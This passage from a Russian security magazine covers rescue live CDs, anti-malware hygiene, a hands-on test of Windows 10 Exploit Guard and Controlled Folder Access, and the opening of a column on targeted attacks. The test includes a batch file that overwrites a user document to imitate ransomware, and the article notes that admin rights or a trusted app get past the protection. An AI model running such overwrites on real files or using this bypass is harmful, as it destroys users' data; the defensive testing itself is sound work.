   опе ративной памяти, ути лита для правки системно го реестра, обновление
   анти вирусных баз, дос туп к интерне ту через бра узер Mozilla Firefox, два
  фай ловых менед жера и анти вирус ное средс тво (утилита Dr.Web CureIt!).





                 Рабочий стол среды Dr.Web Live CD

 • Avira Antivir Rescue System — Live CD от немец кого производите ля. Дас ист
    гут! Позволяет получить доступ к данным в файловом менед жере, содер‐
   жит редактор реестра Avira Registry Editor и пускает тебя в интернет через
   Mozilla Firefox. С помощью встроенной TeamViewer поз воля ет уста нав‐
   ливать удаленное подключение, а посредством GParted — перераспре‐
   делять дисковое пространство.





             Рабочий стол среды Avira Antivir Rescue System


  Универсальные Live CD сборки
 • Hiren’s BootCD — это диск, в котором соб рано множество различных прог‐
   рамм, в том числе и работающих в режиме DOS. Комплект поставки Hiren’s
  BootCD пре дус матри вает не только непос редс твен но ISO‐образ загрузоч‐
   ного диска, но и утилиту для его записи на опти ческий диск, а также ути‐
   литу HBCDCustomizer для соз дания образов загрузочных дисков с поль‐
   зовательским содер жимым.





              Меню Hiren’s BootCD пос ле заг рузки

 • SystemRescueCd — известная уни версаль ная среда вос становления, соз‐
   данная на базе дис трибутива Gentoo  Linux. Содержит инс тру менты
   для работы с жестким дис ком — разбивки на раз делы, диагностики, сох‐
   ранения и вос становления раз делов. Умеет монтировать разделы Win‐
   dows NTFS для чте ния и записи. Содержит также средства для настрой ки
   сети, сетевых сер висов, средства поиска руткитов и антивирус.





           Меню загрузочного дис ка SystemRescueCd

 • Alkid Live CD and USB — наворо ченный и потому универ сальный заг‐
   рузочный диск для восста нов ления системы, пос тро енный на базе Win‐
   dows XP. Работа ет с любых носителей — CD, фле шек, USB‐HDD и дру гих.
  Содержит набор свежих антивирусов, утилит для работы с дисками
   и образами, бэкапа и под нятия сис темы, восста новления потерян ной
  информации и паролей, соз дания новых администраторских учет ных
   записей, воз врата на точки отка та и многого другого.





          Ме ню заг рузочного диска Alkid Live CD and USB


КАК НЕ ЗАРАЗИТЬСЯ: ГЛАВНЫЕ СОВЕТЫ

  Не используй права локального администратора. Включи UAC
Это банально, но мы будем повторять эти прос тые истины до тех пор, пока
хотя бы 15% поль зователей не воспримут их как руководс тво к дей ствию. :)


  Сле ди за обновле ниями системы и сво евре мен но накаты вай se-
curity update
Вот они, наши старые и новые друзья: WannaCry, Petya, Conﬁcker и (новый)
Bad Rabbit.
  Все они активно используют уязвимос ти как сис темного ПО, так и прик‐
ладных программ. Обнови прикладное ПО. Особен но браузер. Помни, что
малварь использует уяз вимости не только системы, но и веб‐движков или их
ком понентов.
   Кстати, если ты счи таешь этот совет глупым, вот тебе информация к раз‐
мышлению: где‐то поблизости существу ют люди (десятки тысяч людей),
у которых на ком пе гнез дится софт с уязвимостями десятилетней  (!) дав‐
ности.
   Как показы вает неумолимая статистика, дыры в ПО, найденные еще много
лет назад, могут быть до сих пор не исправлены, в Windows 10 можно эксплу‐
атировать баг, об наружен ный аж в 1997 году. Не луч ше дела обстоят и с бра‐
узерами и мобильными платформа ми.


  Про качай свой браузер
Настрой правильно
По лезной опцией бра узера может оказаться «Пре дупреждать о небезопас‐
ных сайтах», которая при перехо де на подоз ритель ный (ломанный или инфи‐
цированный) сайт обязательно тебе сооб щит об этом. Точно так же браузер
уве домит, если на сайте используется незащи щенный протокол HTTP вместо
безопасного HTTPS. Браузер может и срав нить пароли при создании их
в веб‐формах и напом нить, как нехорошо юзать один и тот же пасс для всех
под ряд сер висов.
  Неп лохой гайд по настройкам безопас ности для различных браузе ров
можно пос мотреть тут. А вот тут приведены при меры уси ленных настроек
безопасности для последней на сегодня 11‐й версии Internet Explorer.


До лой скрипты
Для защиты браузера нам нуж но минимизировать количество скриптов,
которые могут выпол нять ся, нап ример отключить выпол нение Java.
Хорошим под спорьем ста нут бло кировщики рекламы, баннеров и всплы‐
вающих окон, такие, нап ример, как AdBlock, Adblock Plus.


Установи допол нения
По лезные расширения браузе ра помогут обе зопа сить машину от потен‐
циального зараже ния. Перечислим расширения для трех самых популяр ных
во всем мире браузеров: Chrome, Opera и, конеч но же, Internet Explorer, пос‐
кольку многие еще до сих пор сидят на преж них версиях Windows, в которых
IE идет по умолчанию.


Для Chrome
 • AdBlock — популярный фильтр навяз чивой и не очень баннерной рекламы.
   Часто на зараженных сай тах вредонос ный код может содержаться в неп‐
   римет ных бан нерах и ссылках, замас кированных под всплывающие окна.
   AdBlock от все го это го избавит.
 • Flash Block — некоторые сайты используют Flash для «творческого» сбора
   кукисов и отслеживания тво их действий. Уста нов ка Flash Block даст тебе
   ручной контроль над страницами — позволять загружать Flash‐контент
   или нет, решаешь ты.
 • ScriptSafe — крайне полезное дополнение, созданное для контроля
   над сай тами, использующи ми JavaScript‐код.
 • BugMeNot — часто сталкивался с тем, что нужно оставить свой почтовый
  ящик при регистрации для доступа к сайту или форуму или прос то чтобы
   прочитать статью? BugMeNot предоставляет безопас ную и аноним ную
   альтер нативу.
 • KB SSL Enforcer — дополнение, форсирующее использование Secure
   Socket Layer (SSL).
 • WOT (Web of Trust) — целый набор инс тру ментов для безопас ного сер‐
   финга. Умеет также предуп реждать о сайтах груп пы риска, которые обма‐
   нывают кли ентов, рассылая вирусы или спам.


Для Opera
 • HTTPS Everywhere — расширение, которое переопре деляет запросы
   к сай там и принуди тель но активирует HTTPS. Решение зашифровывает
   соеди нения с сайтами, делая серфинг в интернете безопаснее.
 • Avira Browser  Safety — веб‐фильтр  Avira для браузе ра, включающий
   безопасный поиск, безопас ный просмотр сайтов, защиту от слежения
   и блокировщик рек ламы на базе Adguard.
 • McAfee WebAdvisor — бесплатный плагин от Intel Security, обеспечива‐
  ющий защиту от вре доносных, фишин говых и мошеннических сайтов
   и вре доносных заг рузок.
 • uMatrix — интерактивный блокировщик любых типов запросов браузе ра.
  Позволяет зап ретить заг рузку скриптов, фреймов, плагинов, рекламы
   и прочего.
 • Netcraft  Extension —  расширение,  которое  обеспечивает  защиту
   от фишинга, онлайн‐мошенничества, меж сайтового скриптинга во время
   серфинга  в  интернете  и  предос тавляет  комплексную информацию
  о посещаемых веб‐сайтах.


Для IE
 • LastPass — парольный менеджер. LastPass предлагает такую же функци‐
   ональность, как его аналоги в виде отдельно устанав ливаемого на комп
   приложе ния, включая генера цию и безопасное хранение паролей.
 • Web of Trust предупрежда ет, если сайт потенциально опа сен для посеще‐
   ния.
 • FavBackup — инструмент для резер вного копирования и восстановления
   профиля настройки Internet Explorer.

Не удив ляй ся тому, что мы включили сюда IE, — пользоваться этим глу боко
уязвимым браузером мы никому не совету ем, но он до пос ледне го времени
фигурировал как обязательный в некоторых системах ДБО.


Ис пользуй VPN
По мимо очевидной ано нимности, VPN полез на еще и тем, что в случае перех‐
вата тра фика не даст хакеру заполучить  то, что он намере вался. Если
говорить о бесплатных VPN‐сервисах, то мож но юзать OpenVPN в качестве
клиента, а настройки для под ключений брать на сай те FreeVPN. Но, если чес‐
тно, у нас у всех VPN куп ленный, а к халявному VPN мы бы стремиться
не советовали. ;) Вот интерес ные коммерческие VPN‐сервисы:
 • Private Internet Access — один из кру тейших VPN‐сервисов в Рос сии, судя
   по количеству наг рад, которые он получил. Фишка PIA в том, что он обес‐
   печивает не только шифрование тра фика, но и анонимизацию с отвязкой
   от реги онального расположения. На выбор пользователя доступно поряд‐
   ка тысячи серверов, расположен ных в десяти разных стра нах. При том PIA
   не хра нит логи, не зап рещает никакие про токолы и IP‐адре са и не хранит
   у себя информацию о действиях пользователей. Стоимость услуг начина‐
   ется с семи дол ларов в месяц. Воз можно подклю чение до пяти различных
   устройств.
 • CyberGhost VPN — давно хорошо зарекомен довавший себя VPN‐сервис,
   который, как и остальные участни ки рейтинга, заявляет об отсутс твии
   логов и ограниче ний на типы протоко лов и проходящий трафик. На твой
  выбор сот ни сер веров из 23 стран мира. Стоимость услуги начинается
   с семи долларов в месяц; если требует ся под ключить больше одного
   устройства, нужно будет доп латить.
 • ZenMate — прос лавленный VPN‐сер вис, вклю чающий множес тво функций
   и возможностей: шиф рование трафика с помощью AES‐128, встроенное
   ускорение сер финга по сайтам, высокоскоростные серверы, рас положен‐
  ные по все му миру. Стоимость от пяти долларов в месяц, пробный пери‐
   од — семь дней.

Это лишь несколь ко примеров VPN‐серверов. Можешь посмотреть рейтинг
и выб рать сам.




Довольно часто случается, что закрываешь веб‐стра нич ку на каком‐нибудь
дырявом сайте — и откры вается миллион око шек в режиме «на весь экран»,
без возможности зак рыть их стандартным способом. Бывает, что и управле‐
ние мыш кой тоже бло киру ется. Что же делать?
 1. Свернуть окно по горячим клавишам Win + Home или Win + D, открыть
   стан дартный менеджер задач Windows комбинацией Ctrl + Alt + Del и зак‐
   рыть процесс. В этом случае все несохранен ные данные будут потеряны.
 2. Сочетанием Shift + Esc запустить диспетчер задач бра узера, что позволит,
   не завершая родительский процесс, закрыть только нить (thread), которую
   заюзал popunder‐зловред.




  Ис пользуй секьюрный DNS
Неп лохо бы прописать в конфиге сво его роутера или сетевой карты исполь‐
зовать DNS‐сер веры, филь трующие опас ный кон тент:
 • Яндекс.DNS с IP‐адресами


   77.88.8.88
   77.88.8.2

 • Cisco OpenDNS


   208.67.222.222
   208.67.220.220

 • Norton ConnectSafe, под держиваемый компанией Symantec


   199.85.126.10
   199.85.127.10


  Зачисть под ключаемые устройства и победи авто запуск
По бедить проблему autorun.inf стоило еще нес коль ко лет назад, поэтому нав‐
сегда отклю чи у себя автозапуск.
  Все чужие флеш ки луч ше проверять в чистой зоне виртуаль ной машины
или монтировать запоми нающий том в Linux, которой они не страшны. Чужие
флешки — реальное зло, зараже ны они, как мне кажется, в 80% случаев. :)


  Настрой файрвол
Грамот но настроенный брандма уэр поможет снизить пло щадь атаки: закроет
неисполь зуемые порты, разорвет нецелевые TCP/UDP‐сессии и будет кон‐
тролиро вать при ложе ния, которые стучат ся в сеть изнутри. Линуксоиды тра‐
дици онно уважают iptables, настраивать которую можно как в консоли, так
и исполь зуя при вычный многим GUI‐интерфейс. В Windows есть встро енный
брандмауэр, мож но настраивать его через штатную панель или использовать
более гибкую GUI‐надстройку Windows Firewall Control.


  Забудь про вло жения и непонятные ссыл ки
Тут и говорить нечего. Если очень интерес но — открывай на виртуаль ной
машине с «Линуксом»  :). Про верить, находится ли сайт в черном списке
и есть ли на нем опасные редирек ты и подозрительные скрипты, можно, нап‐
ример, используя бесплатные онлайн‐ска неры Sucuri, ReScan.pro и всем
известный и хорошо зарекомендовавший себя VirusTotal.


  За что бьют сисопа? За отсутствие бэкапа. Тебя это тоже каса-
ется
Коммерческие бэкап‐решения сейчас у всех на слуху, они обладают впечат‐
ляющи ми воз можностями, вклю чая даже защиту информации от шифроваль‐
щиков и механизмы резервного копиро вания информа ции в твоих соцсетях.
Бесплатные решения не столь удоб ны, но и они все еще живее всех живых.
 • Clonezilla —  это  пол ностью  бесплатное  програм мное  обеспечение
   с открытым исходным кодом. Данная софтинка реализова на по принципу
   пошаго вого мас тера и работает почти в тек стовом режиме, без графичес‐
   кого интерфей са. Программа отлично под ходит для клонирования дисков
   и отдельных разделов жес ткого дис ка, а также создания резер вных копий
   и аварийного восста новления системы.





                     Интерфейс Clonezilla

 • Paragon Backup & Recovery 16 Free Edition — набор ути лит от извес тного
   разработчика Paragon Software, поз воляющих соз давать, форматиро вать,
   удалять разделы, прятать или откры вать их, назначать букву и менять метку
   тома, выполнять проверку целос тнос ти файловой сис темы. Отдельно сто‐
   ит отметить, что резервирова ние дан ных может быть выпол нено в так
   называемый кап сюль, то есть в скрытый раз дел, который невоз можно
  смон тировать и увидеть в операционной сис теме.





         Интерфейс Paragon Backup & Recovery 16 Free Edition


OUTRO

Сов ременная малварь использует все возможные способы и уязвимос ти,
чтобы инфицировать сис тему жертвы. Поэтому и для борьбы с ней необ‐
ходимо прив лекать микс всех техник противо дей ствия, при веденных в нас‐
тоящем матери але. С одним инс трументом эффективность будет низ кой —
только вооружив шись всем арсе налом, ты получаешь реальный шанс дать
достойный отпор зловредам!
MALWARE





КАК УСТРОЕНА ЗАЩИТА
В ОБНОВЛЕННОЙ WINDOWS 10


                                                                                     84ckf1r3
                                                                                        84ckf1r3@gmail.com





Этой   осенью   Windows   10   обно вилась   до   вер‐
сии 1709 с кодовым названи ем Fall Creators Update или Red‐
stone 3. Сре ди мно жества изменений нас прежде всего
заинтересовала улуч шенная защита от неизвестных злов‐
редов. В Microsoft при няли ряд мер для противодействия
троянам‐шиф роваль щикам и эксплоитам. Нас коль ко же они
оказались успешны?


СТАРЫЙ НОВЫЙ ЗАЩИТНИК
Все новое — это хорошо реб ренди рованное старое. В «осеннем обновле нии
для дизайнеров» встроенные компоненты защиты объединили в «Центре
безопасности Защитника  Windows». Даже  програм мный файрвол  стал
называться «Брандмауэр Защит ника Windows», но эти изменения — чисто
косметические. Более существенные каса ются новых функций, которые мы
под робнее рассмот рим ниже.
  Еще один ста рый‐новый компонент, появившийся в Redstone 3, называ‐
ется «Защита от экспло итов». Windows Defender Exploit Guard, или прос то EG,
включает ся через «Центр безопасности Защитника Windows» в раз деле
«Управле ние приложе ниями и браузером».
   Тех нически Exploit Guard — это бывшая служебная программа Enhanced
Mitigation Experience Toolkit со слег ка вырос шим набором функций и новым
интерфейсом. EMET появилась еще во времена Windows Vista, теперь же ее
под держка прекращена, а  Exploit Guard занял ее место. Он отно сится
к средс твам прод винутой защиты от угроз (Advanced Threat Protection), наряду
с менеджером подклю чаемых устрой ств Device Guard и защитником приложе‐
ний Application Guard. Злые языки погова рива ют, что в Microsoft изначально
хотели представить общий ком понент Advanced System  Security Guard,
но аббревиатура вышла совсем неблагоз вучной.


ЗАЩИТА ОТ ЭКСПЛОИТОВ
Exploit Guard — это всего лишь инструмент сни жения риска, он не избавляет
от необ ходимос ти закрывать уязвимос ти в соф те, но затрудняет их исполь‐
зование. В целом принцип работы Exploit Guard сос тоит в том, чтобы зап‐
рещать те опе рации, которые чаще всего используются зловредами.
  Проблема в том, что мно гие легитим ные программы тоже их используют.
Более того, есть старые прог раммы (а точ нее, динамические биб лиотеки),
которые прос то перестанут работать, если задействовать в Windows новые
функции контро ля памяти и про чие современные средс тва защиты.
  Поэто му настрой ка Exploit Guard — это такие же вилы, какими ранее было
использование EMET. На моей памяти многие администраторы месяцами
вни кали в тонкости нас троек, а затем просто прекращали использовать огра‐
ничи тельные функции из‐за многочисленных жалоб пользователей.
   Если же безопас ность превыше всего и тре бует ся закрутить гай ки потуже,
то самыми востре бованными функциями Exploit Guard были (со вре мен EMET)
и оста ются:
 • DEP (Data Execution Prevention) — предот вращение выпол нения данных.
  Не позволя ет запустить на исполнение фраг мент кода, оказав шийся в не
   пред назна ченной для этого области памяти (например, в резуль тате
  ошиб ки перепол нения стека);
 • слу чайное перераспре деле ние памяти — предотвращает атаку
   по известным адре сам;
 • отключение  точек расширения — препятствует внедрению DLL
   в запус каемые процессы (см. статью про обход UAC, где этот метод
  широко использовался);
 • ко манда DisallowChildProcessCreation — зап рещает указанному при‐
   ложению соз давать дочерние процессы;
 • фильтрация таб лиц адре сов импорта (IAF) и экспорта (EAF) —
   не поз воляет (вре доносному) про цессу выполнять перебор таблиц адре‐
   сов и обращать ся к странице памяти системных библиотек;
 • CallerCheck — проверя ет наличие прав на вызов конфиденциаль ных API;
 • SimExec — ими тация выполнения. Про веряет перед реальным исполне‐
  нием кода, кому вернутся вызовы кон фиденциаль ных API.

Ко ман ды могут быть переданы через PowerShell. Например, запрет соз давать
дочерние про цессы выглядит так:


Set‐ProcessMitigation ‐Name исполняемый_файл.exe
  ‐Enable DisallowChildProcessCreation

Все x86‐процессоры и чипсеты последних десяти лет выпуска поддерживают
DEP на аппа ратном уров не, а для совсем ста рых дос тупна програм мная
реали зация этой функции. Однако ради сов местимос ти новых версий Win‐
dows со старым софтом Microsoft до сих пор рекомендует включать DEP
в режиме «только для системных процессов». По той же причине была
оставле на  возможность  отключать  DEP  для  любого  про цесса.  Все
это успешно используется в техниках обхо да сис темы пре дотвра щения
выполнения данных.
  Поэто му смысл от исполь зования Exploit Guard будет толь ко в том слу чае,
если есть воз можность задей ствовать сра зу нес коль ко защитных функций,
не вызывая сбой хотя бы в работе основных приложений. На практике
это ред ко удается. Вот пример про филя EG, конверти рованного из EMET,
который вооб ще вызывает  сваливание Windows 10  в BSoD.  Когда‐то
в «Хакере» была рубрика «Западлостроение», и Exploit Guard бы в нее отлично
вписался.


ЗАЩИТА ОТ ШИФРОВАЛЬЩИКОВ
«Все ваши фай лы были зашифрованы. Для их рас шифровки перечис лите бит‐
кой ны по указан ному адресу», — наверняка ты уже видел подобную над пись
если не на сво ем, то на чужом рабочем сто ле.





                                 All your base are belongs to us!

Сегод ня шиф ровальщики — основной подкласс троянов‐вымогателей, а Win‐
dows — основная атакуемая платформа. Поэтому Microsoft старается пред‐
при нять дополнительные меры защиты. Проблема в том, что шифроваль‐
щики — это не классические вирусы, и эффективное противодей ствие им
требует принципиаль но других подходов. Отловить извес тного трояна по сиг‐
натуре под силу прак тически любому антивиру су, а вот пой мать нового —
сов сем другая задача.
   Уп реждающий удар со стороны антивиру са затруднен хотя бы потому, что
трояны‐вымога тели используют легитим ные средс тва криптогра фии, как и
многие популярные программы. В их коде обыч но нет явных признаков зло‐
наме ренной активности, поэто му эвристика и другие меры несигнатурного
ана лиза час то не срабатывают.
  Поиск отличительных маркеров ransomware — головная боль всех анти‐
вирусных разработчиков. Все, что они пока могут пред ложить, — это под‐
менить задачу. Вместо поиска рансомварей сосредоточить ся на их основной
цели и смотреть за ней. То есть — контролировать доступ к файлам и катало‐
гам поль зовате ля, а так же регулярно делать их бэкап на случай, если шиф‐
ровальщик все же до них доберется.
   Как мы выяснили в одной из предыдущих ста тей, на практике это далеко
не иде альный подход. Контроль доступа — это снова баланс между безопас‐
ностью и удобством, сильно смещенный в сто рону дис комфорта. Концепту‐
аль но ситу ация такая же, как и при использовании Exploit Guard: либо зап‐
рещающие правила применяются спол на, но работать за компьютером ста‐
новится проблематично, либо ограниче ния заданы фор мально ради сох‐
ранения сов местимости со старым соф том и удобс тва пользовате ля.





        Вклю чаем контроль доступа к папкам в Windows Defender

По добный контроль дос тупа давно появился в сто ронних антивиру сах,
но немного в другом виде. Он был нацелен на сохранность системы, а не
на обнаружение угроз. Пред полагается, что, если антивирус промор гает
злов реда, допол нитель ные средс тва кон тро ля прос то заблокируют нежела‐
тель ные изме нения в катало ге \Windows\ и загрузчике.
   Если для системных файлов этот под ход еще как‐то годит ся, то для поль‐
зовательских — нет. В отличие от сис темного каталога, содержимое которого
более‐менее оди наково на разных компьютерах, в пользовательском может
находиться что угодно. К тому же запросы на изменение файлов в нем могут
пос тупить от любой программы. Добавь к этому OLE, возможность любого
про цесса вызывать другой и открывать файлы через него, и ты получишь
представ ление о том, как выг лядит ад для антивирус ного раз работчика.
  Поскольку модификация  пользовательских файлов  никак  не  влияет
на работу ОС, в Windows не было встро енных средств их защиты. Все изме‐
нилось с выходом обновленной вер сии Windows 10, в которой встроенный
«Защитник» начал контролировать документы, фотографии и прочий поль‐
зовательский контент. Утвержда ется, что он не даст заменить файлы их
зашифрованными версиями, лишая авторов троянов повода тре бовать выкуп.


ЭКСПЕРИМЕНТ
Для про вер ки мы решили соз дать тестовую пап ку C:\Docs\ с документами
раз ного типа и добавить ее в спи сок кон троля доступа Windows Defender.
Затем запустили несколько троянов‐шиф ровальщиков и пос мотрели, сможет
ли «Защитник Windows» им противостоять.





                Добавляем контро лируемую папку

В этом тесте Windows Defender справился с под боркой троянов лучше многих
сторонних антивирусов. Он просто не дал скопиро вать с сетевого диска
ни один образец, вклю чая раз ные модифи кации WannaCry, Petya, TeslaCrypt,
Jigsaw, Locky и Satana. Все они были автоматически удалены, несмотря
на изме ненное расширение (.tst) и упаков ку средства ми UPX.





    «Защит ник Windows» обезвредил на лету модифи кацию трояна Petya

Но вый компонент «Контролиру емый дос туп к пап кам» — это часть защиты
в реальном времени. Поэтому отклю чить в Windows Defender сканирование
на лету и проверить новую функцию отдельно не удастся. Отключить постоян‐
ную защиту можно только полностью, но тогда результат будет пред ска‐
зуемым.





                     Лог зашиф рованных файлов

Мы расширили тестовую под борку шифроваль щиков, вклю чив в нее све жие
и мало известные виды. Одна ко Windows Defender моментально уда лял их все,
не оставляя выбора. Поэто му было решено провес ти модель ный экспе‐
римент, написав… нет, нет! Что вы, гос подин прокурор! Никакой не троян,
а простей шую безвредную прог рамму. Вот ее  код, добро пожаловать
в девяностые!


@echo off
echo Open `Docs` directory
cd C:\Docs\
dir
echo The original content of `lenses.txt` file is listed below:
more < lenses.txt
echo Changing text in file 'lenses.txt'...
echo File data was replaced by this string>lenses.txt
echo Done!
more < lenses.txt

Любой шифроваль щик заменяет файлы пользователя их зашифрован ными
версиями. По сути, нам тре буется проверить, как функция «Контролируемый
доступ к пап кам» блокирует операции переза писи файлов в каталоге поль‐
зователя. Эта программа как раз заменя ет содержимое файла в указанном
катало ге той строкой, которую ты сам укажешь. Знак > перенаправляет кон‐
сольный вывод в файл, полностью перезаписы вая его.
  Преимущество у этого батника в том, что он выг лядит подозрительно
(исполняемый файл с низ кой репута цией) и его код точно неизвестен анти‐
вирусу. Он был написан только что и не успел ниг де засветиться. В качестве
цели был указан файл lenses.txt, поскольку его содержимое отформа тиро‐
вано знаками табуляции и наг лядно отобража ется в консоли командой more
в пределах одного экрана.
  После запуска командный файл показы вает содержимое каталога C:\
Docs\, а затем — файла lenses.txt. Он пытается переза писать его строкой
File data was replaced by this string и сно ва показы вает содержимое
lenses.txt для проверки результата. Сам коман дный файл запус кается
из другого каталога — «Заг рузки», имитируя привычку неопыт ного поль‐
зователя (скачивать что ни попадя и кликать на все подряд).
   Если мы просто запустим батник двойным кликом, то увидим, что файл
lenses.txt остался в преж нем виде. Функция «Контролиру емый доступ
к пап кам» спра вилась со своей задачей, пре дот вра тив перезапись документа
по команде от неиз вестного исполняемого файла. При этом текст можно спо‐
кой но открыть и отре дактировать в «Блокноте», а потом сохранить поверх
ста рого, и это не вызовет никаких вопросов. Notepad — доверенный процесс,
и для поль зователя защита работает прозрачно.





         Защит ник Windows заблокиро вал изме нения документа

При желании можно добавить стороннее приложение в список доверенных.
Да, ты совершенно верно вос принял это как потенциальный век тор атаки.





              До бавляем приложение как доверенное

Ес ли мы предварительно выполним повышение при виле гий и запустим наш
батник с правами адми на, то файл lenses.txt будет тихо перезаписан.
Защитник Windows не шелохнется и даже не отразит это событие в логе. Ему
все рав но, админ отдал команду или какой‐то левый файл от имени админа.





                  Документ уда лось изме нить

Таким образом, с исполь зовани ем (само)доверен ных процессов или с
помощью предварительного повышения привиле гий трояны‐шифровальщики
смогут обойти новую фун кцию «Контролируемый доступ к папкам», появив‐
шуюся в Windows 10 v. 1709. Причем сде лать это можно даже методами вре‐
мен MS‐DOS. Да здравс тву ет совместимость!


ВЫВОДЫ
Exploit Guard оказался EMET в новой обер тке, а «Контроль доступа» — защит‐
ной полумерой. Она поможет снизить ущерб от прос тейших шифроваль‐
щиков, запускаемых с правами пользователя. Если же автор очередной ран‐
сомвари будет исполь зовать техники повышения при вилегий или сможет
отправить зап рос на изме нение файлов через доверенный процесс, то новые
функции Windows 10 не спа сут данные пользователя. Минимизировать пос‐
ледс твия зараже ния поможет только регулярный бэкап. Главное, чтобы троян
не смог зашифровать и резервные копии. Поэтому  луч ше хра нить их
на непере записываемом (или хотя бы отклю чаемом) внеш нем носителе
и иметь дубликат в обла ке.




                           •Exploit Guard
                     •Ко мандлеты для Exploit Guard
                     •Windows Defender Advanced Threat Protection
 MALWARE





  Денис Макрушин
 Специализируется на
 исследовании угроз и
 разработке технологий
защиты от целевых атак.
  #InspiredByInsecure
  condifesa@gmail.com





КОЛОНКА ДЕНИСА МАКРУШИНА




 Как бороться с целенаправлен ными атаками? Оче видно, что
 нужно  какое‐то  технологи ческое  решение,  в  котором
 были бы объединены лучшие идеи по обна ружению неизвес‐
 тных угроз. Но прежде чем говорить о нем, стоит опре‐
 делиться с тем, что считать целевой атакой, и разобрать,
 как они работа ют.


 В новостях то и дело мелькает: «В результате таргетированной атаки прес‐
 тупни кам уда лось украсть два миллиар да долларов из 40 банков и финан‐
 совых организаций по все му миру…», «…Жертва ми ата ки, направленной
 на про мышленные ком пании, стали более 500 энер гетичес ких, металлурги‐
 ческих и стро ительных ком паний более чем в 50 странах…», «…Эффективные
 и  грамотно  размещенные  вредоносные  прог раммы,  предназначенные
 для реализации  атак на сис тему  SWIFT, поз волили кибер прес тупникам
 украсть миллионы…» и так далее, и так далее.
    Таргетиро ванные атаки (они же APT) — настоящий бич нашего вре мени,
 и на защите от них уже пос троен не один многомиллионный биз нес. Заг‐
 лядываешь на любую выставку, посвященную ИБ, и видишь: для продающей
 стороны APT — это теперь важ ная часть предложения, а для покупающей —
 одна из насущ ных проб лем. Причем актуальна она уже не только для крупного
 бизнеса, наученного горь ким опытом, но и для сред него и даже малого. Если
 ата кующий хочет доб рать ся до корпорации, то мелкий подрядчик впол не
 может оказать ся промежуточ ной целью.


 НЕ ПРОСТО СЛОВА
 К сожале нию, термины «таргетированная атака» и «целенаправленная атака»
 некор рек тны. Почему? Вспомним классическое определение компьютерной
 ата ки: «Компьютерная ата ка — целенап равлен ное несанкциони рованное
 воз действие на…». Стоп, стоп, уже дос таточно! Получается, что цель‐то есть
 у любой атаки, а не толь ко у «таргетиро ванной».
   Отличительная особен ность целенаправленных атак заключается в том,
 что ата кующий активно и интеллектуально под ходит к вы бору точ ки входа
 в кон крет ную инфраструктуру, достаточно долго ана лизирует циркулиру ющую
 в ее ком понентах информа цию и исполь зует соб ранные дан ные для получе‐
 ния доступа к ценной информации.
   Слы шу возмущенные крики из зала: «Люди день ги теряют, а он к терминам
 цеп ляется!» Однако академи ческая точность опи сания проблемы чрез вычай‐
 но важ на для соз дания той самой «сереб ряной пули», универсаль ного
 решения, о котором пи сал Иван Новиков.
   Иссле дователи обычно рас сматривают отдельные аспекты атак и не про‐
 водят комплексный анализ проб лемы. Поэто му несовершенны и методы
 выяв ления атак и борьбы с ними в уже скомпромети рованной сре де.
   Нап ример, многие методы и системы безопасности основаны на ста‐
 тических списках шаб лонов, то есть на базах для эвристического анализа,
 «белых списках», базах сиг натур и так далее. Одна ко такие спис ки ока зыва‐
 ются неэффективными для определе ния «нешаблонных» угроз, при которых
 злоумышленники ста раются скрыть свое присутс твие в скомпромети рован‐
 ной инфраструктуре.
   Ме тод, который в соответствии с требованиями различных стандартов
 обеспечения ИБ гарантиру ет отсутс твие в сис теме наруши теля, заключается
 в создании и под держании замкну тых доверен ных программно‐аппарат ных
 сред. Имен но  так «бумажная безопасность» исключает ком промета цию
 на любом этапе.
    Увы, с практической точки зре ния этот метод неэффекти вен. Современ‐
 ные программно‐аппаратные среды обычно построены на основе оборудо‐
 вания и соф та разных производителей, которые используют разные подходы
 при разработ ке, разные методы обновления и поддержки. Исследовать все
 про дукты, нет ли в них закладок, нереаль но, а без это го никаких доверенных
 сред не выйдет.
   Другой метод защиты ценных ресурсов от целенаправленного несанкци‐
 онированного дос тупа основан на физической изоляции защищаемых объ‐
 ектов. И он тоже неэффекти вен в реальных условиях. Даже если удастся зак‐
 рыть все побоч ные каналы связи, которые могут быть исполь зованы зло‐
 умыш ленни ками для вывода данных, оста ется челове ческий фактор. Нередко
 побоч ные каналы связи соз дают имен но люди, взаимо действуя с сис‐
 темами, — неп реднамеренно или же умышленно.


 ПРОБЛЕМА РЕШЕНИЯ
 По лучается, что избежать риска компро метации фак тически невозможно.
 Соот ветственно, нужны системы выявления неиз вестных атак в уже скомпро‐
 метированной среде. Этот класс решений носит гор дое наз вание post‐breach
 («пос ле взлома») и чаще всего реша ет задачу response/mitigation, то есть
 реагирова ния и смягчения.
   А вот методов и пос троенных на их основе решений для своевре менного
 детек та угроз (post‐breach detection) в действи тель ности не так много. Нап‐
 ример, один из них —  это сети ловушек, которые широко известны
 как «ханипоты».





   Уровни, на которых может быть реализова на система ловушек (по мне‐
   нию Gartner)

 Правильно сделанная ловушка дей стви тельно может помочь обнаружить
 целенап равленную ата ку на опре делен ной ста дии. Но при этом классичес кий
 ханипот вряд ли чем‐то поможет в выявлении дру гих точек присутс твия ата‐
 кующего.
   Известны способы адаптивного развертывания систем ловушек, а также
 поиска ано малий в функционировании компонен тов сис темы. Гораз до слож‐
 нее найти рекомендации, как выбирать парамет ры раз верты вания ханипотов.
 Сколько нужно фейковых рабочих стан ций в сети? Какие фейковые аккаунты
 и на каких машинах соз дать? Еще сложнее проанализи ровать получен ные
 таким способом данные. «Окей, Google, кто‐то воспользовал ся фей ковой
 учеткой на компьюте ре нашего бух галтера. Что теперь делать?»


 НЕОПОЗНАННОЕ ≠ СВЕРХЪЕСТЕСТВЕННОЕ
 Что бы не вносить терминологическую путани цу, будем исполь зовать термин
 «неизвестная компьютерная атака». Она может включать в себя свойства
 целенап равленных атак, но не ограничивать ся ими. Неиз вестная компьютер‐
 ная атака — это непрерывное целенаправленное несан кционированное воз‐
 дей ствие при помощи прог раммных или прог раммно‐аппарат ных средств
 с такими параметрами функци онирова ния, которые не позволяют защитным
 решени ям его обнаружить в реальном вре мени.
    Звучит сложно? На самом деле все сводится к трем ключевым особен‐
 ностям: непрерыв ности, целенаправлен ности и нетриви альности.
   Непрерывность — характеристика, определяющая временной интервал,
 в течение которо го ата кующий сохраня ет несан кционированный дос туп
 к ресурсу или воздействует на него. В частности, целенап равлен ные атаки
 отли чают ся про должительным  контролем  точек при сутствия  в целевой
 информацион ной системе.
   Це ленаправлен ность — характерис тика, которая опре деляет сте пень
 руч ной работы со сто роны ата кующего для реали зации несанкционирован‐
 ного дос тупа или воз дей ствия и учитыва ет инди виду альные особенности
 целевой инфраструк туры.
   Нетривиальность для систем обна ружения атак — это характеристика,
